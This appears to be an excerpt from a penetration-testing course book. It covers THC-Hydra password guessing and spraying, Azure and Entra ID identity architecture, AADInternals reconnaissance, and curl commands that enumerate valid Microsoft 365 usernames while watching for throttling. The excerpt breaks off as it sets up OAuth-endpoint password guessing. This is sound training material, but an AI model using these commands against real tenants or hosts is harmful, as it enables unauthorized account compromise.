- Patator: https://github.com/lanjelot/patator
- Metasploit: https://metasploit.com
- Multiple Nmap Scripts

The choice of tool is often based on the protocol and authentication type, but for a given protocol and authentication type, there are often multiple tools that accomplish the same task, so the choice comes down to being a personal one. For example, Patator and Hydra both cover a lot of the common protocols. Some penetration testers like the simplicity of Hydra, while others like the granularity of Patator.

![](SEC560_Book2_page_58_Picture_1.jpeg)

# **THC-Hydra**

- Target a list of targets: **-M** *targets.txt servicename*
- Credentials to use for guessing:
  - − Single user with **-l** *username* or a list with **-L** *userfile.txt*
  - − Single password with **-p** *password* or a list with **-P** *passfile.txt*
  - − Specific *username***:***password* combinations with **-C** *credfile.txt*
- Supported protocols:
  - − Cisco, CVS, FTP[S], HTTP[S], HTTP-Proxy, IMAP[S], LDAP, MSSQL, MySQL, Oracle, POP3[S], Postgres, RDP, Redis, SIP, SMB, SMTP[S], SNMP, SOCKS5, SSH, SVN, TELNET[S], VMAuthd, VNC, xmpp!
- Use with a proxy (**socks5://**, **socks4://**, or **connect://**) **export HYDRA\_PROXY=socks5://127.0.0.1:1080**

THC-Hydra is a password-guessing tool that targets a variety of network services. Hydra is a commandline tool. The suite also features a GUI frontend called xHydra, which enables a user to configure various options to generate a command line that it passes to the Hydra tool to run.

Hydra can be used against a single target or a list of targets (-M targets.txt). You can target a single user with –l username or a list of users with -L userfile.txt. Similarly, you can select a single password with -p password or a list of passwords with -P passfile.txt. Note for the user and password options that the lowercase u/p is a single user or password, while the uppercase version uses a list. If you have a list of credentials, such as breached, cracked, or previously guessed credentials, you can put them in a colon-delimited file (format: user:password) and use -C credfile.txt.

As mentioned, the tool supports a number of protocols. Per the documentation, the tool supports the following protocols:

adam6500 asterisk cisco cisco-enable cvs firebird ftp ftps http[s]- {head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp

You can also use Hydra through various proxies by setting the environment variable in Linux with a command like this:

export HYDRA\_PROXY=socks5://proxylogin:pass@127.0.0.1:9150

The credentials proxylogin:pass are only required if the proxy requires it. You can use different proxy types by replacing socks5 with socks4 or connect.

Hydra is written by van Hauser/THC and David Maciejak and is available at:

• https://github.com/vanhauser-thc/thc-hydra.

# **Hydra Examples**

• Single user, multiple passwords targeting SSH on port 2222

```
hydra -l root -P passwords.txt ssh://1.2.3.4:2222
```

• Spray targeting SMB on default port with a single thread (**-t 1**)

```
hydra -L users.txt -p password1 -t 1 dc01.foo.local smb2
```

• Try a specific username and password across the network

```
hydra -l jsouik -p P@ssw0rd! -M windows-hosts.txt smb2
```

• Use previously compromised credentials across the network

```
hydra -C creds.txt -M win-hosts.txt smb2
```

As mentioned, with a traditional password guessing attack, we select a single user and attempt multiple passwords. To target a single account with multiple passwords on a single SSH server on the non-default port of 2222, we can use the following command:

```
hydra -l root -P passwords.txt ssh://1.2.3.4:2222
```

Some services, such as SMB, do not like multiple authentication attempts at the same time. To perform a password spray attack against a spray targeting SMB on the default port with a single thread (-t)

```
hydra -L users.txt -p password1 -t 1 smb://1.2.3.4
```

Try a specific username and password across the network

```
hydra -l jsouik -p P@ssw0rd! -M windows-hosts.txt smb
```

Use previously compromised credentials across the network

```
hydra -C creds.txt -M windows-hosts.txt smb
```

By default, Hydra checks all passwords for one login and then tries the next login. The -u option "loops around the passwords, so the first password is tried on all logins, then the next password." This option is combined with the other options and only makes sense with a list of users (-L) and a list of passwords (- P).

```
hydra -u -L users.txt -P passwords.txt 10.130.10.5 smb2
```

# **Hydra with the Domain**

Target domain controllers to guess domain user passwords:

• We also need to specify the domain to perform this attack

**hydra -C creds.txt dc01.hiboxy.com smb2 –m workgroup:{hiboxy}**

- Use **-m** to provide additional options to the selected module
- The curly braces **{}** are required
- Use **workgroup** even though we are targeting a domain (it's the option name)

When guessing passwords for domain users, we typically target the domain controller. Besides the usernames and passwords, we need to specify the domain. We need to use the -m option to provide module-specific options. To find the options available for a given module, use hydra -U *modulename*. With the smb2 module, we use the below syntax to specify the domain.

hydra [options] smb2 -m workgroup:{DOMAINNAME}

Replace DOMAINNAME with the domain used in your target environment, such as hiboxy. The {} (curly braces) are required. Also, the keyword workgroup is required even though we are targeting the domain.

![](SEC560_Book2_page_62_Picture_1.jpeg)

# **Password Guessing**

Refer to the lab workbook for instructions.

![](SEC560_Book2_page_63_Picture_2.jpeg)

#### **Course Roadmap**

Section 1: Miniature Engagement, Recon, and Scanning

Section 2: Scanning and Initial Access

Section 3: Post-Exploitation

Section 4: Domain Privilege Escalation and Lateral Movement

Section 5: Persistence and Evading Controls

Section 6: CTF and Next Steps

- Version Scanning with Nmap and Netcat
- Visual Scanning with GoWitness
- Vulnerability Scanning and Analysis
- Nmap Scripting Engine
- OS Detection Techniques
  - Lab 2.1: Version Scanning, OS Detection, NSE, and GoWitness
- Initial Access
- Password Guessing
  - Lab 2.2: Password Guessing
- Azure Intro
- Entra ID
- Azure Recon
- Azure Password Attacks
  - Lab 2.3: Azure Recon and Password Attacks
- Sniffing and Relaying
- Responder
  - Lab 2.4: Responder
- Exploitation
- Exploit Categories
- Metasploit and Meterpreter
  - Lab 2.5: Metasploit and Meterpreter

![](SEC560_Book2_page_64_Picture_2.jpeg)

#### **Azure**

- Microsoft has several online services:
  - − Microsoft Platforms: Azure, DevOps, Xbox Cloud
  - − Microsoft Business Platforms: Microsoft 365 (formerly Office 365), Exchange, Teams, Power BI
  - − Microsoft Identity Services: Entra ID, Microsoft Account
- Microsoft Statement: 95% of Fortune 500s use Azure
- Many companies are "accidentally" using Azure through their Office apps

![](SEC560_Book2_page_64_Picture_10.jpeg)

![](SEC560_Book2_page_64_Picture_11.jpeg)

Over its long history, Microsoft has created a multitude of online services. Microsoft has had a consumerfacing set of online services like Microsoft Hotmail, Microsoft Accounts, and even today, Xbox Cloud. What about business or enterprise services? Microsoft started its online history somewhat haphazardly. Consumer accounts and security issues show up in backward-compatibility challenges that Microsoft has to support across its user base.

Microsoft's foray into online services includes its introduction of MSN, Hotmail, and some consumer

sign in to some enterprise services. These Microsoft Accounts are akin to Google Consumer accounts that can exist in a consumer environment or are mixed with G Suite accounts. We will discuss several modes, such as Azure B2C and Entra ID External Support.

For Enterprise users, which is the focus of our class, you have several online services that Microsoft offers to businesses. Microsoft claims that 95% of Fortune 500 companies use Azure (https://azure.microsoft.com/en-us/overview/what-is-azure/). How is this so? Microsoft's products range from Infrastructure and Platform as a Service in Azure to integral business apps like Office, SharePoint, Exchange, Power BI, and more. Those applications are tightly integrated into Entra ID, regardless of whether you bring a third-party IdP like Okta, Google, Ping, SailPoint, or native Active Directory. We will be exploring some of these technology systems throughout the next module.

64

#### **Azure Services**

#### • **Microsoft Azure**:

- Microsoft's Infrastructure as a Service and Platform as a Service
- Azure allows for infrastructure to be run in the Microsoft Cloud, such as virtual machines, virtual networks, file shares, shared databases, etc.

# • **Entra ID (formerly Azure Active Directory)**:

- OpenID Connect Identity Provider (OIDC IdP)
- Entra ID provides the authentication for both Azure, Microsoft (Office) 365, and thirdparty services that support OAuth2 and SAML

Microsoft's platforms include Microsoft Azure Platform and the Microsoft Entra ID System. The Azure Platform is Microsoft's IaaS (Infrastructure as a Service) and Microsoft's PaaS (Platform as a Service).

but is also intimately tied into Azure.

When you first get access to the Azure Portal, you will be using Entra ID in its freely available version. Entra ID provides the authentication and authorization to the Azure Platform; it can also enable third-party federation as it is an OpenID Connect (OIDC) Identity Provider (IdP).

Azure IaaS features all of the cloud-based components you would find in typical cloud providers. Virtual Machines, Block and Standard Storage, Networking Facilities, Shared Databases, and almost 100+ discrete services. Entra ID is the IdP for both Azure and Microsoft 365. Have you ever been in an environment with on-premises Active Directory and Cloud Hosted Exchange? They more than likely have Entra ID to facilitate that access.

# **Interacting with Online Services**

- Each online service has one or more management portals:
  - − Cataloged at https://msportals.io
  - − 200+ individual portal links so far
- Microsoft Azure and Entra ID are managed through their CLI
  - − Azure PowerShell module(s) (.NET based)
  - − Azure CLI tool (Python-based, cross-platform)
- Azure Cloud Shell available once you're logged into Azure

Each one of the Microsoft services will have a separate management portal. For many non-Microsoft administrators, you may be familiar with the Azure Portal or the Office 365 portal. There are, however, over 200 management portals for the various Microsoft services. It is tough to keep track of them. Fortunately, a user has created a portal aggregation site at https://msportals.io. Some of the portals you may find helpful in an engagement include:

- https://portal.azure.com: The Main Azure Portal
- https://myaccount.microsoft.com: User account management page
- https://security.microsoft.com: Microsoft Security for Defender
- https://endpoint.microsoft.com: Microsoft Intune Page
- https://myapplications.microsoft.com: User-enrolled applications, including third-party apps

To assess cloud assets' security, we will focus on using the CLI tools that provide equivalent access to the Microsoft systems. Azure PowerShell modules exist for PowerShell version 7, and for cross-platform usage, the Azure CLI can facilitate access. These tools are typically loaded onto your system or a remote management system. Another option is a built-in shell in the UI called the Microsoft Cloud Shell. The Cloud Shell provides you with a Linux bash environment with your login credentials in memory. The shell also has a preloaded set of the management tools. The concept of the Cloud Shell is also available in other cloud providers, such as Google Cloud Platform.

#### **Entra ID in Relation to Azure**

- Entra ID's relationship to Azure can be confusing
  - − Entra ID is a service in Azure
  - − Entra ID users and permissions are required to *use* Azure
  - − Entra ID is an Azure *requirement*
- Azure's RBAC (Role Based Access Control) IAM permissions are set *within* Azure, **not** Entra ID
  - − This is unique to Azure, as Entra ID can set scopes for third parties like Office

![](SEC560_Book2_page_67_Picture_9.jpeg)

When setting up Azure, you will have an Entra ID environment for the user and group management. Unlike the standard on-premises Active Directory ("Active Directory: Domain Services") system, Entra ID and Azure are almost intertwined. It is accessible from within the Azure Portal. It is also required for Azure to communicate. Entra ID has many built-in roles that can be used when communicating with thirdparty systems like Microsoft Office or, in the case of the graphic shown, Microsoft 365.

For example, a User Administrator in Entra ID is also a User Administrator in Microsoft Office; the roles are transmitted between the systems. A User Administrator or Global Administrator Entra ID is not automatically a privileged user in an Azure Subscription. An Administrator must set up those permissions explicitly. This type of access can be confusing. As testers, we have to remember the following:

Azure permissions are set within Azure IAM.

Entra ID roles can be used for specific Microsoft Services such as Microsoft 365.

#### Reference:

• https://docs.microsoft.com/en-us/azure/role-based-access-control/rbac-and-directory-admin-roles

![](SEC560_Book2_page_68_Picture_2.jpeg)

#### **Course Roadmap**

Section 1: Miniature Engagement, Recon, and Scanning

Section 2: Scanning and Initial Access

Section 3: Post-Exploitation

Section 4: Domain Privilege Escalation and Lateral Movement

Section 5: Persistence and Evading Controls

Section 6: CTF and Next Steps

- Version Scanning with Nmap and Netcat
- Visual Scanning with GoWitness
- Vulnerability Scanning and Analysis
- Nmap Scripting Engine
- OS Detection Techniques
  - Lab 2.1: Version Scanning, OS Detection, NSE, and GoWitness
- Initial Access
- Password Guessing
  - Lab 2.2: Password Guessing
- Azure Intro
- Entra ID
- Azure Recon
- Azure Password Attacks
  - Lab 2.3: Azure Recon and Password Attacks
- Sniffing and Relaying
- Responder
  - Lab 2.4: Responder
- Exploitation
- Exploit Categories
- Metasploit and Meterpreter
  - Lab 2.5: Metasploit and Meterpreter

![](SEC560_Book2_page_69_Picture_2.jpeg)

#### **Microsoft Entra ID**

- Entra ID is an Identity Management System storing users and groups for authentication and authorization to third parties.
- Entra ID supports several types of hybrid authentication modes.
  - − Currently supported protocols for Entra ID include OpenID Connect, OAuth2, SAML, WS-Fed, and Microsoft Kerberos (in preview).
- Entra Seamless SSO allows on-premises users to sign in to Entra ID automatically.
- It does this by passing a domain hint such as:
  - − http://myapplications.microsoft.com/hiboxy.com
- User accounts are seamlessly authenticated by domain-joined machines or Microsoft Entra–joined machines

Microsoft Entra ID is the authentication and authorization system from Microsoft designed to replace the classic Active Directory system. Entra ID stores our enterprise's user and group information for use in third-party systems and within the Microsoft Ecosystem. Entra ID does not support many of the legacy protocols of AD DS. Instead, it uses the following protocol types:

- OAuth2 (and OpenID Connect)
- SAML
- WS-Fed
- Kerberos (Preview Mode)

One of the system features is called Desktop SSO (or Seamless SSO), which provides the user with a seamless user experience once they are logged in to either the Entra ID domain by joining with Entra ID or using AD DS join. With this Seamless SSO command, a user can open a web browser, which can authenticate the user by leveraging the user's domain authentication or Entra ID authentication within the system.

![](SEC560_Book2_page_70_Figure_0.jpeg)

To better understand Entra ID, it is best to first understand how the user experience and the authentication system operate. It is also good to look at how the different parts of the system are supposed to operate and how they are not supposed to operate. Abuse will occur in the parts of the system that have to support protocols or mechanisms that might not have been designed with security in mind. Suppose a user wants to log in to a Microsoft Property, such as one of the following:

- Microsoft Azure
- Microsoft Office 365
- Microsoft's AZ CLI Tool
- Microsoft's PowerShell Azure Module
- Microsoft Online
- Microsoft Power BI

The first thing that happens is that Microsoft's authentication system detects that the email (or User Principal Name) is registered with an Entra ID tenant and will be forwarded to a Microsoft Sign In page that may seem familiar to you. This flow (usually an OpenID Connect Code Flow) will occur with a command-line interface tool launching a browser. At this point, it's also good to know that many of the systems that are known as "fat clients" will generally have a registered application in the Entra ID system, and these clients will send that application identifier as a client identifier in the system. This includes clients like Outlook, Word, Azure CLI, PowerShell CLI, and others.

![](SEC560_Book2_page_71_Figure_0.jpeg)

To make the authentication flow work, any property integrated with Entra ID, including Azure, will redirect you back to the Entra ID login endpoint, which points to login.microsoftonline.com. This is not the only authentication endpoint; other API endpoints handle authentication that we can also abuse and sometimes do not respect newer technologies like password-less authentications and MFA.

The URL below is an example of what the request to your browser will look like:

https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize? redirect\_uri=https%3A%2F%2Fportal.azure.com%2Fsignin%2Findex%2F&respon se\_type=code%20id\_token&scope=https%3A%2F%2Fmanagement.core.windows.ne t%2F%2Fuser\_impersonation%20openid%20email%20profile&state=OpenID Connect.AuthenticationProperties%3DysnyqREDACTEDhOSq7&response\_mode=fo rm\_post&nonce=6377REDACTEDY1OTRk&client\_id=c44b4083-3bb0-49c1-b47d-974e53cbdf3c&site\_id=501430&prompt=select\_account&client-requestid=d28c579b-b8e7-4949-a820-98f0e00c824e&x-client-SKU=ID\_NET472&xclient-ver=6.12.2.0

The following are the important components of this URL to key in on:

- redirect\_uri: Where the browser will be redirected to after authentication.
- scope: This is what you're attempting to request; for example, the scope, in this case, points to https://management.core.windows.net.
- client\_id: This is the identifier for the web browser we are using.

Other components are useful for OAuth and OpenID Connect as well, but for now, the preceding fields are the ones relevant to our conversation.

![](SEC560_Book2_page_72_Figure_0.jpeg)

The username is now entered into the page, and Entra ID will perform some checks. It will check to make sure that the domain in question is registered. Some domains will be federated; in other words, their IdP is not in Entra ID but instead hosted on another IdP. If you are an Okta or Ping Federate user, this will be where you are redirected to those systems. If not, the next check is whether the User Principal Name, which you may recognize as the "username," is valid. If the username and password are accurate, the next check is a conditional access policy check. Can the user log in? Does the user's signal match the policy? What are the signals? Is the browser user agent string Windows Edge or Mobile? Does the user need to perform MFA? Is the user in a trusted location, or does the user require MFA? These items are validated to ensure that the user can get key material.

![](SEC560_Book2_page_73_Figure_0.jpeg)

Several things will happen now that we have a valid username and password. The first is that the Entra ID system will generate and provide a JWT (JSON Web Token), which serves as the authorization token as well as the identifier of the user. The system will also redirect us to the redirect\_uri value stated in the second portion of this set of slides. Regardless of whatever the redirect\_uri was set to, it will ask for and receive the access\_token. This value will be used to validate the user. We now see how a user can leverage Entra ID to perform authentication and authorization to third parties in this flow. We will see more of this in our labs and over the following few modules.

# **Microsoft Authentication Systems**

| Description                 | Entra ID                          | On-Prem AD DS                   | Microsoft Entra<br>Domain Services |
|-----------------------------|-----------------------------------|---------------------------------|------------------------------------|
| Communication<br>Protocol   | HTTPS                             | LDAP                            | LDAP                               |
| Authentication<br>Protocol  | OIDC, OAuth2,<br>SAML*            | Microsoft Kerberos or<br>NTLMv2 | Microsoft Kerberos or<br>NTLMv2    |
| Organizational<br>Structure | Flat Structure                    | Domains and Forests             | Single Domain                      |
| Access Control              | Groups, Scopes<br>for Permissions | Groups, ACLs for<br>Permissions | Groups, ACLs for<br>Permissions    |
| Multi-Domain<br>Support     | Azure B2B or B2C                  | Multi-Forest Mode               | Not available                      |

Microsoft has several identity management systems. Its rich history means that Microsoft has legacy or classic identity management systems, such as the On-Premises Active Directory Domain Services (AD DS) components and newer systems, such as Microsoft Entra ID. Microsoft also has a hosted version of AD DS, known as Microsoft Entra Domain Services (Entra DS). Several unique differences exist between on-premises Active Directory domain services and the hosted version.

Microsoft AD DS On-Premises can have multiple forest modes, multiple domains, and many different types of administrators. The hosted version has limitations, such as only supporting a single domain, no concept of forests, no extensions of schemas, and no domain administrators. It primarily supports Microsoft Entra ID users in a Windows Domain. Entra DS also doesn't support the Entra ID Connect system, similar to On-premises. Instead, Entra ID pushes users and passwords into Microsoft Entra Domain Services.

Microsoft Entra ID supports multiple authentication protocols beyond OIDC (OpenID Connect), OAuth v2, and SAML. It supports WS-Federation, Azure B2B Federation, Azure B2C Federation, and Kerberos (in preview as of the time of this writing). It is possible to support more than just these protocols, as one of its competitors, Okta, supports LDAP. Always check the compatibility of these legacy protocols with newer authentication mechanisms, such as multi-factor authentication (MFA), which may not fully support them. Multiple domains and forests are not possible in this system. Instead of multiple domains, you could have various tenants. There are many caveats to this; however, you can have external guest users in Azure B2B (Business to Business) instead of a cross-forest trust. There is a consumer component called Azure B2C (Business to Consumer) that supports applications that need to have user accounts stored in an OIDC system.

The most significant change you will see between Entra ID and Microsoft's on-prem Active Directory: Domain Services is access control. You may be used to seeing Active Directory ACLs with read and write permissions. These ACLs no longer exist in the same way in Entra ID. Entra ID uses scopes, such as the

scope of a virtual machine in Azure, the entire subscription, and the permission to read or write. Using a scope, you can control the ability to "write" changes to a virtual machine, but not a network group. Understanding scope is critical because it will impact what we can do in the system and, perhaps, how to escalate privileges.

![](SEC560_Book2_page_76_Picture_1.jpeg)

# **Identity Architectures in Microsoft**

There are several types of Identity Architectures in Microsoft today:

- Entra ID
  - − Hosted Software-as-a-Service (SaaS)
  - − Supports Federating Identities
- Microsoft Active Directory Domain Services (Microsoft AD DS)
  - − On-premises self-hosted Domain Services from Microsoft
  - − Frequently found in Azure as a Domain Controller inside Azure Compute
- Microsoft Entra Domain Services (Entra DS)
  - − Hosted version of Microsoft AD DS with many limitations

Microsoft has several Identity Management Systems that it uses today. You are probably familiar with some of these and less familiar with others. Microsoft's Active Directory Domain Services (Microsoft AD DS) is the one that most users are familiar with. AD DS is an X.509 LDAP-based Object store that stores objects such as user accounts within the object tree. It is classically deployed "on-premises" but can also be deployed within a virtual machine in the cloud. Frequently, we find in Azure that backup domain controllers are deployed in the Azure Cloud.

The virtual machines deployed in the cloud may confuse some, as we may think this is cloud-hosted AD DS, but it is standard AD DS. It can have an Entra ID Connect agent.

The second type of system discussed in this class is Microsoft Entra ID or Entra ID. Entra ID is an OpenID Connect Identity Provider (OIDC IdP). It can federate third-party access and federate to other OpenID Connect IdPs. It is the primary mechanism to log in to Azure and Microsoft 365. If you see Microsoft 365, you can rest assured it is more than likely running Entra ID.

The third type of server we will only lightly discuss here is the cloud-hosted Microsoft Entra Domain Services (Entra DS). Its primary purpose is to help facilitate legacy SMB and Active Directory access to servers running in the Azure Cloud. The cloud-hosted version of Active Directory has much fewer options and is more secure than the on-premises Active Directory. It cannot have users added to it—that is, the users from Entra ID. It doesn't support some of the more insecure features of Active Directory.

![](SEC560_Book2_page_77_Picture_1.jpeg)

# **Synchronization and Federation**

Several mechanisms exist to federate or synchronize directories:

- Password Hash Synchronization:
  - − Can use the Entra ID Connect application, of which only one agent can be active at a time; the rest are in "staging mode"
  - − Entra ID Connect Cloud Sync, which is a hosted version of Entra ID Connect
- Pass-through Authentication
  - − Entra ID passes the request back to the site
- AD FS Federation
  - − AD FS federates for on-premises AD
- Hosted Entra DS, which has some special properties

Entra ID can either synchronize passwords from an on-premises Active Directory environment or federate to a third party. The federation to third parties can even include on-premises Active Directory through ADFS. We will discuss these options here, as you might encounter them in a penetration test.

Password Hash Synchronization, or PHS, relies on an Entra ID Connect agent running on a server in the environment. Only one agent can run in a single organization. The user object will then get a special LDAP GUID that will be used to specify that this user account is being synchronized. The object will have a different name, but Microsoft will refer to it as the sourceAnchor. Password Hash Synchronization will perform several rounds of hashing to take an NT Hash and eventually store it as a PBKDF2 Hash1.

Pass-through authentication is different from password hash synchronization. In pass-through authentication, a pass-through authentication agent obtains the request to check the hash. The system will then return a response to Azure to sign the user on. This type of synchronization will rely on the usernames and passwords not being checked in Entra ID but being passed to the local on-premises exchange.

ADFS Federation works much like a federation to other third parties. Similar to Passthrough authentication, once the authentication request comes into Entra ID, the request is redirected for federation. Instead of being in the background, the page will be presented to the user. This type of federation is not unique to ADFS but is also used in other IdPs such as Ping Federate.

#### Reference:

• https://docs.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-password-hashsynchronization

![](SEC560_Book2_page_78_Picture_2.jpeg)

#### **Course Roadmap**

Section 1: Miniature Engagement, Recon, and Scanning

Section 2: Scanning and Initial Access

Section 3: Post-Exploitation

Section 4: Domain Privilege Escalation and Lateral Movement

Section 5: Persistence and Evading Controls

Section 6: CTF and Next Steps

- Version Scanning with Nmap and Netcat
- Visual Scanning with GoWitness
- Vulnerability Scanning and Analysis
- Nmap Scripting Engine
- OS Detection Techniques
  - Lab 2.1: Version Scanning, OS Detection, NSE, and GoWitness
- Initial Access
- Password Guessing
  - Lab 2.2: Password Guessing
- Azure Intro
- Entra ID
- Azure Recon
- Azure Password Attacks
  - Lab 2.3: Azure Recon and Password Attacks
- Sniffing and Relaying
- Responder
  - Lab 2.4: Responder
- Exploitation
- Exploit Categories
- Metasploit and Meterpreter
  - Lab 2.5: Metasploit and Meterpreter

#### **Introduction to AADInternals**

- Several tools exist to attack environments running both Azure and Entra ID
- AADInternals from Dr. Nestori Syynimaa (@DrAzureAD) is one of these tools − Found on his blog at https://aadinternals.com/
- A collection of PowerShell modules useful in both discovery and recon and in attack of Entra ID

![](SEC560_Book2_page_79_Picture_6.jpeg)

AADInternals is a collection of PowerShell scripts created by Dr. Nestori Syynimaa (@DrAzureAD), who maintains a blog at https://aadinternals.com/. The toolchain comes from many hours of reverse engineering Entra ID calls, as many of the features within the toolchain come from undocumented API calls.

The tool does not wrap itself around existing modules. Instead, it re-implements the functionality to display more data than the modules. The tool supports both authentication and unauthenticated sessions.

AADInternals has several tools we can use to perform reconnaissance activities on Azure and attack Entra ID. Over 50+ modules exist in the system, and many of them are helpful for both external actions and internal actions. The one benefit of the AADInternals modules is that they can be used programmatically to make our attacks more realistic, instead of relying on manual scripts or manual interaction with APIs.

Several modules can help us attack an Entra ID environment by leveraging the local system integrations. One of those modules is AADIntPTASpy. This module installs a DLL inside a domain controller to hook and record usernames and passwords passed through the pass-through authentication agent in the Entra ID environment. This module is part of the hacking functionality of AADInternals, which is currently a small but powerful collection of scripts.

# **Loading and Installation**

To install AADInternals, we can use the following PowerShell command:

#### **PS C:\> Install-Module AADInternals**

Importing the AADInternals collection to the current PowerShell session is accomplished as follows:

# **PS C:\> Import-Module AADInternals**

#### Reference:

• https://aadinternals.com/aadinternals/#install-aadintptaspy

![](SEC560_Book2_page_80_Picture_2.jpeg)

#### **AADInternals Recon**

- AADInternals has PowerShell modules for both external and internal recon
  - − Part of the AAD and M365 Kill Chain
- Some modules exist to perform domain reconnaissance:
  - − Does Entra ID have a tenant with this domain? What other domains are associated?
- Others help with user reconnaissance:
  - − Do these particular usernames exist within this domain?

PS C:\> **Invoke-AADIntReconAsOutsider -DomainName hiboxy.com | Format-Table** PS C:\> **cat .\users.txt | Invoke-AADIntUserEnumerationAsOutsider -UserName**

AADInternals does have modules that support both external and internal recon activities. The internal activities rely on having an authenticated session, while the external actions are unauthenticated. This module is part of the AAD and M365 Kill Chain work that maps out how attackers abuse Entra ID and Microsoft 365 applications.

#### **External Reconnaissance**

For the external reconnaissance parts, we want to start looking at what domains exist on tenants, Entra ID hosted and federated. The module command we can use is:

# **Invoke-AADIntReconAsOutsider -Domain hiboxy.com | Format-Table**

This module command performs a check with Azure for the domain that we pass (in the example, hiboxy.com).

Once we know that the domain exists, we can then perform username enumeration using a different module:

# **cat .\Users.txt | Invoke-AADIntUserEnumerationAsOutsider -UserName**

In this example, we read the contents of a file, users.txt. This file will then have its contents passed into Invoke-AADIntUserEnumerationAsOutsider, with the -UserName argument passed in with the contents of users.

This module uses three modes of operation:

- Normal: This appears to pass information to one of the APIs discovered as a sign-in endpoint.
- Login: This appears to be a different login API endpoint, and this one is tracked and shows up as a login event.
- Autologin: A different API that appears not to log the sign-in event failed.

#### **Unauthenticated Username Validation**

- Some Azure endpoints provide unauthenticated access to information on users
- Sending a request to them tells you if the user is **valid** or **not valid**
  - − *GetCredentialType* endpoint for username validation
    - https://login.microsoftonline.com/common/GetCredentialType
  - − *OAuth Token* endpoint for user validation and password guessing
    - https://login.microsoftonline.com/organizations/oauth2/v2.0/token

Be careful with your requests per minute, to prevent throttling and Smart Lockout!

Microsoft Azure offers penetration testers useful application endpoints that facilitate key information on users. Neither endpoint requires authentication, and both provide excellent paths to finding whether a user is valid or not, with pros and cons to each approach. Generating a request is as easy as running a curl command line, with the parsed response telling us if the user is valid.

# The two endpoints are:

- GetCredentialType: This endpoint provides username enumeration, telling us whether or not the user is valid. It's very easy to use with command-line curl. The disadvantage is that an excessive rate of traffic can be throttled by the Azure platform (location: https://login.microsoftonline.com/common/GetCredentialType).
- OAuth Token: This endpoint provides username enumeration as well. An advantage is that it also provides password guessing. A disadvantage is that it can also be detected by Azure with the Azure Smart Lock feature (location: https://login.microsoftonline.com/organizations/oauth2/v2.0/token).

These two methods are recommended for their ease of use, effectiveness, and automation capability; however, other methods exist for username enumeration. These other methods can involve more manual steps or Base64 encoding credentials. These approaches include using the Azure Portal web application (https://portal.azure.com), Outlook AutoDiscover, Microsoft Server ActiveSync, and https://login.microsoftonline.com/rst2.srf (which is used by OneDrive).

We must be careful and aware of throttling, detection, and rate limiting by the Azure platform. Azure can detect an excessive rate of queries and throttle the response. This can lead to false positives in our penetration testing, so we always want to avoid this!

#### Reference:

• Red Siege Information Security: https://www.redsiege.com/m365

![](SEC560_Book2_page_82_Figure_0.jpeg)

Using the GetCredentialType endpoint for correct username enumeration on Azure involves three steps.

Step 1: Ensure that the domain is "Managed" on Azure.

We must first ensure that the domain for this tenant is managed on Azure as the Identity Provider. This will ensure that the results returned by GetCredentialType are correct. To do this, query the getuserrealm.srf endpoint and look for the "NameSpaceType" returning a value of "Managed":

curl -s https://login.microsoftonline.com/getuserrealm.srf\?login\= <DOMAIN>\&\json\=1 | jq .NameSpaceType

Here's an example of querying the domain "redsiege.com":

curl -s https://login.microsoftonline.com/getuserrealm.srf\?login\= redsiege.com\&\json\=1 | jq .NameSpaceType

Other possible values include "Unknown" and "Federated". To ensure proper results of querying the GetCredentialType endpoint, we look to verify the response of "Managed" to indicate a domain that is managed by Azure as the Identity Provider (IdP).

Step 2: Generate a POST request to the endpoint.

Generate the request, rotate in the username desired for the query, and then query the "IfExistsResult" key's value.

We can use Curl to generate this request. For example, in the query below, we are testing for 'moses@redsiege.com' and asking to return the value of "IfExistsResult".

A user that does not exist:

```
curl -s -X POST 
https://login.microsoftonline.com/common/GetCredentialType --data 
'{"Username":"moses@redsiege.com"}' | jq .IfExistsResult
```

A user that exists:

```
curl -s -X POST 
https://login.microsoftonline.com/common/GetCredentialType --data 
'{"Username":"tim@redsiege.com"}' | jq .IfExistsResult
```

Step 3: Evaluate the response.

A response of 0 indicates that the user exists on Azure as a managed domain. This means that Azure is the Identity Provider (IdP) for the domain. A response of 1 means that the user does not exist.

Take caution to ensure that the domain is verified as "Managed" in the first step. In some cases, a result of 0 can be returned for a domain that is not managed by Azure as the IdP, leading to false positives.

# **Detecting Throttling: GetCredentialType Endpoint**

- Azure can detect a high rate and *throttle* the response to *GetCredentialType* endpoint, leading to false positives.
- To detect when throttling is taking place, decode the *ThrottleStatus* response and ensure that **2** is not returned.
- A value of 0 or 1 indicates Azure is not throttling the response.

```
curl -s -X POST https://login.microsoftonline.com/common/GetCredentialType --data 
'{"Username":"tim@redsiege.com"}' | jq '.ThrottleStatus'
Response is not being throttled
```

The Azure platform can detect a high rate of traffic sent to this endpoint and throttle the status. This will impact the efficacy of our results, leading to false positives. When building a script to perform username enumeration, we must ensure that throttling is not taking place. Evaluate the "ThrottleStatus" key's value and ensure that a value of 2 is not returned. A value of 0 or 1 is fine and does not indicate throttling or false positives.

Here is an example of using Curl and Jq to parse the response of "ThrottleStatus":

```
curl -s -X POST 
https://login.microsoftonline.com/common/GetCredentialType --data 
'{"Username":"tim@redsiege.com"}' | jq '.ThrottleStatus'
```

Bringing all of this together, we can use curl and string interpolation to write out a single line showing the username queried, the response to IfExistsResult, and the response to ThrottleStatus. This can be used in a script to loop through a list of usernames, parse the response for a valid username, and determine whether the response is being throttled by the Azure platform.

```
curl -s -X POST 
https://login.microsoftonline.com/common/GetCredentialType --data 
'{"Username":"tim@redsiege.com"}' | jq '. | "Username: \(.Username) 
IfExists Result: \(.IfExistsResult) Throttle Result: 
\(.ThrottleStatus)"'
```

84

![](SEC560_Book2_page_85_Picture_1.jpeg)

# **Username Enumeration: OAuth Token Endpoint (1)**

- A POST request to the *OAuth Token* endpoint
  - − More input fields than GetCredentialType endpoint, including password
  - − Validates users on the Azure tenant through an error code response
  - − Tells us if MFA is enabled on the account (if correct password)
  - − Several automated tools exist for this method
- Example of manual request using curl:

```
Rotate Username
```

```
$ USER="jeff@redsiege.com"
$ PASS="Fluffybunny12!"
$ url="https://login.microsoftonline.com/organizations/oauth2/v2.0/token"
